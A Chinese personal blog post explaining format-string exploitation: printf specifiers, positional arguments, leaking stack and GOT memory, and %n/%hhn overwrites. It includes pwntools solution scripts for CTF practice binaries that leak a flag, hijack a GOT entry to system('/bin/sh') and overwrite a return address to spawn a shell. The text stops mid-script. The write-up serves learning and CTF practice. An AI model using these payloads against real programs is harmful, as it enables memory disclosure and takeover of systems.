<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content=""><meta name="keywords"><meta name="author" content="Second_BC,undefined"><meta name="copyright" content="Second_BC"><title>【Second_BC の BloG】</title><link rel="stylesheet" href="/SecondBC/css/fan.css"><link rel="stylesheet" href="/SecondBC/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/SecondBC/favicon.ico"><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/SecondBC/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/SecondBC/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: ,
  valine: ,
}</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/SecondBC/atom.xml" title="Second_BC の BloG" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="author-info"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/SecondBC/ss.jpg"></div><div class="author-info-name">Second_BC</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/" target="_blank">GitHub<i class="icon-dot bg-color0"></i></a><a class="links-button button-hover" href="mailto:1" target="_blank">E-Mail<i class="icon-dot bg-color7"></i></a><a class="links-button button-hover" href="tencent://message/?uin=2&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color3"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/SecondBC/archives"><span class="pull-top">日志</span><span class="pull-bottom">36</span></a><a class="author-info-articles-tags article-meta" href="/SecondBC/tags"><span class="pull-top">标签</span><span class="pull-bottom">10</span></a><a class="author-info-articles-categories article-meta" href="/SecondBC/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/SecondBC">首页</a><a class="menu-item" href="/SecondBC/archives">归档</a><a class="menu-item" href="/SecondBC/categories">分类</a><a class="menu-item" href="/SecondBC/tags">标签</a><a class="menu-item" href="/SecondBC/about">关于</a></nav><div class="right-info"><a class="title-name" href="/SecondBC/">Second_BC の BloG</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><div id="recent-posts"><!-- each post in page.posts.sort('date', -1).limit(10).toArray()--><!-- config中配置按照什么排序--><div class="recent-post-item"><a class="post-title" href="/SecondBC/2023/04/13/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">格式化字符串</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2023-04-13</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Pwn/">Pwn</a></div></div><div class="post-content"><div class="main-content content"><p>具体见：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_2">利用 - CTF Wiki (ctf-wiki.org)</a></p>
<h2 id="写法"><a href="#写法" class="headerlink" title="写法"></a>写法</h2><p>在使用printf函数时，会用到如下内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%d			<span class="comment">//打印整数</span></span><br><span class="line">%x			<span class="comment">//打印十六进制</span></span><br><span class="line">%p			<span class="comment">//打印指针数值（32位打印4字节，64位打印8字节）</span></span><br><span class="line">%s			<span class="comment">//打印字符串（打印地址指向的内容）</span></span><br><span class="line">%n			<span class="comment">//将该格式化之前的字符数量通过地址存入变量中；</span></span><br></pre></td></tr></table></figure>

<p>这里重点说明下 %s，%n；</p>
<p>%s 虽说时用来打印字符串的，但其本质是将参数视作指针，打印指针指向的内容，一直显示到 ‘\x00’ ，当使用 recv() 函数接收时，得到的是 byte 类型，所以可以得到 int 类型；</p>
<p>%n 如下图所示：</p>
<p><img src="https://s2.loli.net/2023/04/13/pYgjawuVRLskP4A.png" alt="%n"></p>
<p>它将存储出现在 %n 之前的字符数量到对应的参数变量中，本身不会有任何显示；</p>
<p>如上图实际打印的内容是： “geeks for geeks” ；</p>
<p>且 %n 一般跑在gcc编译的c中，Windows上的编译器会有问题；</p>
<p>同样只能跑在 gcc 中的另类写法，也是格式化字符串利用的核心：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">3</span>$x</span><br></pre></td></tr></table></figure>

<p>用下面代码举例，上面的写法会打印出printf的第4个参数的hex形式，也就是c；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$x&quot;</span>,a,b,c,d);</span><br></pre></td></tr></table></figure>

<p>3的意思是从格式化字符串开始往后算的第三个参数，x表示格式；</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在32位程序中，调用函数时，变量都是存在栈上的，比如当调用下示代码时，会有如此的栈格式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$x&quot;</span>,a,b,c,d);</span><br></pre></td></tr></table></figure>

<p>栈：</p>
<table>
<thead>
<tr>
<th>ebp-&gt;</th>
<th>0xold_ebp          //printf函数内部栈帧</th>
</tr>
</thead>
<tbody><tr>
<td>0地址</td>
<td>0xretaddr          //返回地址</td>
</tr>
<tr>
<td>1地址</td>
<td>0xstringaddr       //格式化字符串 “%3$x” 地址</td>
</tr>
<tr>
<td>2地址</td>
<td>a</td>
</tr>
<tr>
<td>3地址</td>
<td>b</td>
</tr>
<tr>
<td>4地址</td>
<td>c</td>
</tr>
<tr>
<td>5地址</td>
<td>d</td>
</tr>
</tbody></table>
<p>当然真实情况中，这些参数的顺序会有变化（一般就是这样），但是可以通过调试确定下来；</p>
<p>格式化字符串符号 <code>%</code> 的作用就是：读取栈中这些变量的内容，对应的将其打印出来；</p>
<p>第一个%打印第一个参数，第二个%打印第二个参数，也就是栈中的a，b；</p>
<p>当然用特殊的写法可打印对应的参数的内容；</p>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用 <code>%k$p</code> 获取数据内容，利用 <code>%k$s</code> 获取指针指向的内容，利用 <code>[AimAddr]%k$s</code> 获取指定地址处的内容；</p>
<h3 id="泄露栈变量内存"><a href="#泄露栈变量内存" class="headerlink" title="泄露栈变量内存"></a>泄露栈变量内存</h3><p>考虑如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%2$x&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>它没有跟参数能这样写吗？</p>
<p>答案是可以，拿上面用表格画的栈图来说，此时它的作用就是将3地址的内容以十六进制打印出来，尽管此时3地址里放的是奇怪的东西；</p>
<p>于是就可以先算出想要得到的 在main栈帧 里的数据对于地址1的间隔 k；</p>
<p>比如现在main中想得到其上级函数的ebp值，调试可知ebp的值存于 m地址 中，那么 k 就应该是：<br>$$<br>k = （m地址 - 1地址） / 指针长度<br>$$<br>指针长度即为对齐，32位是4，64位是8；</p>
<p>此时执行    <code>printf(&quot;%k$p&quot;);</code>    便可得到main中储存的上级函数ebp的值；</p>
<p>这个k的数值，也同样是printf函数的第 k+1 个参数，因为1地址中存的是格式化字符串，也就是printf函数的第 1 个参数；</p>
<h3 id="泄露以变量为指针指向的内存"><a href="#泄露以变量为指针指向的内存" class="headerlink" title="泄露以变量为指针指向的内存"></a>泄露以变量为指针指向的内存</h3><p>还记得 %s 的作用吗，它会打印出以变量为指针所指的内容；</p>
<p>got表就是一个指针，对于在got表地址上的函数，其实都是指向其真实存在的地址的指针；</p>
<p>假设scanf在got中的地址就是0x12345678，那么利用如下代码，便可打印出 scanf 函数的真实地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x12345678%x%k$s&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>当此格式化字符串在输出函数调用时是第 k+1个参数的时候，这么写，就能让 %k$s 去格式化 0x12345678 字符串，从而就能得到 0x12345678 指向的内容，进而打印出来得到 scanf 真正的地址；</p>
<p>但很多时候，第k + 1个参数是 “3456..” 或者干脆 “烫烫烫0x1234..” 诸如此类的；</p>
<p>意思是，它并没有对齐，所以当调试结果为上述情况时，请在0x12345678地址前添加垃圾信息，使得在 整数倍的 k + 1 上能够直接拿到 0x12345678 地址，进而使得后面的特殊写法打印出该地址指向的内容；</p>
<p>获取栈中指定指针内存就没那么麻烦了，正如泄露变量内存一样的写法，只是将p改为s；</p>
<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>这个时候，%n会帮大忙，它可以将其对应参数视为指针，以int型填入在%n前面的字符数量；</p>
<p>所以当知道要覆盖内存的<strong>地址</strong>，格式化字符串相对于输出函数的<strong>偏移</strong>就可以进行覆盖了；</p>
<p>具体格式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...[AimAddr]...%k$n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>如上的…为垃圾内容负责填充 AimAddr 的对齐，k要找到 AimAddr的位置，后面的…是为了与前面的字符一起扩展成想要的长度，使其填入 AimAddr 中；</p>
<h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>此时要把 AimAddr 放在 %n 的后面，这样能控制填入的数据始终可以小于4；</p>
<p>具体格式如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...%k$n...[AimAddr]&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>此时…的作用就反转了，前面的是控制写入的数，后者为控制地址的对齐；</p>
<h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>可以用 … 来扩展很长很长，但会使得程序的性能变低，出来的速度下降；</p>
<p>以 %hhn 来写，可以使得填入变量的类型为字节，以 %hn 来写，可以使得填入变量的类型为双字；</p>
<p>由此可以控制单个字节的覆盖；</p>
<p>而一个int型是需要占4个字节的，那么分别填入单字节内容，使其最后呈现出大数字的效果就行；</p>
<p>比如：c变量的地址为：[c]，而想对其填入0x12345678则其内存中应该是如此分布的：</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>存储</th>
</tr>
</thead>
<tbody><tr>
<td>[c]</td>
<td>0x78</td>
</tr>
<tr>
<td>[c+1]</td>
<td>0x56</td>
</tr>
<tr>
<td>[c+2]</td>
<td>0x34</td>
</tr>
<tr>
<td>[c+3]</td>
<td>0x12</td>
</tr>
</tbody></table>
<p>x86为小端序存储；</p>
<p>那么对应printf中的内容应该是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;...[c][c+1][c+2][c+3]...%k$hhn...%k+1$hhn...%k+2$hhn...%k+3$hhn&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>使得k能找到[c]的位置，且控制 %k$hhn 前面的数量为 0x78 ，而第二个%hhn的控制数量应该是 0x156，因为只能增大，不能减小，但是填入的是一个字节的内容，所以只会填入 0x56，后面同理；</p>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>用题来举例；</p>
<h3 id="goodluck"><a href="#goodluck" class="headerlink" title="goodluck"></a>goodluck</h3><p>看IDA的main函数：</p>
<p><img src="https://s2.loli.net/2023/04/12/cbldO6YQeJKvHPm.png" alt="main"></p>
<p>可以看的出来整个程序逻辑为，输入后和远程服务器的flag文件比较，仅此而已；</p>
<p>但是它会用printf泄露出输入的内容，所以可以想到用格式化字符串的方法泄露v10的信息；</p>
<p>因为程序是x64，所以函数存放参数的话，是先放在前6个寄存器中，多余的参数放在栈上，所以寻找到合适的栈偏移后，需要加上6；</p>
<p><img src="https://s2.loli.net/2023/04/12/7FrviJtwasYpzeo.png" alt="gdb"></p>
<p>如上图，这是在printf函数内部，此时的栈图rsp刚刚指向返回地址，那么下面的就都可以看成是 “参数” 了；</p>
<p>可以看到构造的flag文件的内容被放到了rsp往下第四个，加上前6个参数，这算作printf函数的第10个参数，所以在邪路时，写为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;%9$s&quot;</span></span><br></pre></td></tr></table></figure>

<p>用指针方式读出该flag；</p>
<p>解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./goodluck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$s&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;what&#x27;s the flag\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>



<h3 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h3><p>未开启 RELRO 保护（Partial RELRO）的程序是可以修改 GOT 表的；</p>
<p>那么可以覆盖System地址给目标函数的地址到got表，此时执行目标函数也就是执行System函数了；</p>
<p>一般步骤：</p>
<ol>
<li><p>获取目标函数的got表地址：IDA查询；</p>
</li>
<li><p>获取System函数的内存地址：通过泄露计算；</p>
</li>
<li><p>写入：运用ROP或者write函数或者%n覆盖；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//此时目标函数为printf</span><br><span class="line">pop eax; ret;           # printf@got -&gt; eax</span><br><span class="line">pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx</span><br><span class="line">add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset</span><br></pre></td></tr></table></figure></li>
</ol>
<p>看题：</p>
<p>查看IDA代码：</p>
<p><img src="https://s2.loli.net/2023/04/12/FEYWX9sbKqay3HM.png" alt="main"></p>
<p>主函数一开始有个比较密码，这个逆向还原就行；</p>
<p>接下来是模拟shell，可以输入三种命令：put get dir，分别创建 file_head ，打印content，打印 file_head；</p>
<p>这个题里不存在栈溢出，所以没办法ret，但却是 partial relro，且有格式化字符串漏洞；</p>
<p>所以可以把puts的got表作为指针修改为System地址去执行，因为两个参数类型数量也一样，满足调用约定；</p>
<p>则binsh字符串写入file_head中，格式化字符串漏洞的内容写入content；</p>
<p>此时可以通过格式化字符串漏洞泄露出printf got表地址，从而得到system函数地址；</p>
<p>具体思路：</p>
<ol>
<li>通过密码；</li>
<li>执行put，写入任意和字符串漏洞内容；</li>
<li>执行get，泄露system地址；</li>
<li>执行put，写入字符串漏洞%n覆盖got表指向地址；</li>
<li>执行get，完成got表覆盖；</li>
<li>再次执行put，写入binsh字符串；</li>
<li>执行dir，完成攻击；</li>
</ol>
<p>首先通过调试把字符串漏洞的偏移确定下来为8；也就是 <code>%7$s</code>；</p>
<p>通过代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">printfgot = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">putsgot = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#输入密码</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Name (ftp.hacker.server:Rainism):&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;rxraclhm&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行put泄露地址</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00haha&#x27;</span>)</span><br><span class="line">p.sendline(p32(printfgot) + <span class="string">b&#x27;%7$s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行get</span></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x00haha&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露printf地址并计算system地址</span></span><br><span class="line">printf_addr = u32(p.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">libc.address = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行put覆盖地址</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x001122&#x27;</span>)</span><br><span class="line"><span class="comment">#pwntools自行构建覆盖payload，7是字符串相对于第一个参数偏移</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>,&#123;putsgot:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#再次执行get</span></span><br><span class="line">p.sendline(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;\x001122&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#最后一次执行put</span></span><br><span class="line">p.sendline(<span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;deadbeaf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行dir实现攻击</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;dir&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>至于为什么前两次发送 file_head 的时候要加\X00，是因为最后执行system(s)的时候，s会有bug，不加00的话，最后的结果是三串字符串连接在一起，导致system找不到路径；</p>
<h3 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h3><p>最重要的思想：通过rbp取栈地址；</p>
<p>查看IDA：</p>
<p><img src="https://s2.loli.net/2023/04/13/3caMnmDPT1EVS2v.png" alt="main"></p>
<p>上面是main函数，一开始会让输入账户和密码，也就是register函数，同时是两个可以利用的缓冲区；</p>
<p>进入choice函数后，和上道题一样，有三个选择，其中edit是重新写入账户密码，show是两次字符串漏洞，quit是执行一个puts函数；</p>
<p>但这道题开启了RELRO保护，所以不能和上道题一样改变puts的got表，所以思想是覆盖返回地址；</p>
<p>返回地址在栈上，既然要覆盖它，就必须拿到栈上的地址，那么rbp存储的内容就很值得推敲了；</p>
<p>在show中拥有两次字符串漏洞，分别展示之前输入的账户和密码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_400B07</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, <span class="keyword">int</span> a5, <span class="keyword">int</span> a6, <span class="keyword">char</span> format, <span class="keyword">int</span> a8, __int64 a9)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Welc0me to sangebaimao!\n&quot;</span>, <span class="number">0x1A</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;a9 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在此程序的地址：0x4008AA处，会发现一个system(“/bin/sh”)的调用，那么可以利用字符串漏洞覆盖返回地址为该地址；</p>
<p>输入se和ss并在return的printf处打下断点并查看栈图：</p>
<p><img src="https://s2.loli.net/2023/04/13/q5evKfMHBwygnWp.png" alt="stack"></p>
<p>可以看到printf的第三个参数是输入的账号，第一排为printf的返回地址，而第二个参数是show函数的返回地址，如下方汇编所示；</p>
<p>第一个参数是show函数的rbp指向，则旧rbp值也是指向栈的，所以可以利用旧rbp值来进行便宜计算，拿到返回地址的地址；<br>$$<br>c0 - 80 - 8 = 38<br>$$<br>则用旧rbp值减去0x38便可以得到返回choice函数地址的地址；</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#把格式化输出的地址转化为int类型的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2i</span>(<span class="params">b,<span class="built_in">len</span></span>):</span></span><br><span class="line">	i = <span class="built_in">len</span></span><br><span class="line">	j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	new_c = [<span class="number">0</span>] * i</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">		new_c[i - j - <span class="number">1</span>] = b[j]</span><br><span class="line"></span><br><span class="line">	j -= <span class="number">2</span></span><br><span class="line">	res = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j+<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span> (new_c[i] &gt; <span class="number">47</span>) &amp; (new_c[i] &lt; <span class="number">60</span>):</span><br><span class="line">			res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">48</span>)</span><br><span class="line">		<span class="keyword">elif</span> (new_c[i] &gt; <span class="number">96</span>) &amp; (new_c[i] &lt; <span class="number">103</span>):</span><br><span class="line">			res += <span class="built_in">pow</span>(<span class="number">16</span>,i) * (new_c[i] - <span class="number">87</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme_k0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一次账号密码</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;Aanyway&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#show1用于泄露返回地址的地址</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">retaddr = p.recv()[<span class="number">8</span>:<span class="number">22</span>]</span><br><span class="line">retaddr = b2i(retaddr,<span class="number">22</span> - <span class="number">8</span>) - <span class="number">0x38</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(retaddr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#edit第二次账号密码</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(retaddr)) </span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#2218对应十六进制08AA,用hn覆盖低两个字节，因为再往上的字节实际上都是40一样的</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;%2218d%8$hn&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">#show2用于返回shell</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="字符串盲打"><a href="#字符串盲打" class="headerlink" title="字符串盲打"></a>字符串盲打</h2><p>字如其名，手里没有可逆向的文件，只能靠格式化字符串输入来获取远程文件的信息以攻占shell；</p>
<p>一般来说有如下步骤：</p>
<ul>
<li>确定程序位数</li>
<li>确定漏洞位置</li>
<li>利用</li>
</ul>
<h3 id="栈泄露"><a href="#栈泄露" class="headerlink" title="栈泄露"></a>栈泄露</h3><p>查看题目输入%p查看多少位：</p>
<p><img src="https://s2.loli.net/2023/04/13/qGOrZsHwXg834m1.png" alt="aim"></p>
<p>此图的上半部分展示了它是64位的程序；</p>
<p>且它有提示告知了：flag is on the stack；</p>
<p>那么就循环输入%p一直查看栈上的内容，正如上图的下半部分所示即可得出flag；</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#把格式化输出的地址转化为int类型的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2i</span>(<span class="params">b,<span class="built_in">len</span></span>):</span></span><br><span class="line">	i = <span class="built_in">len</span></span><br><span class="line">	j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	new_c = [<span class="number">0</span>] * i</span><br><span class="line">	<span class="keyword">for</span> j 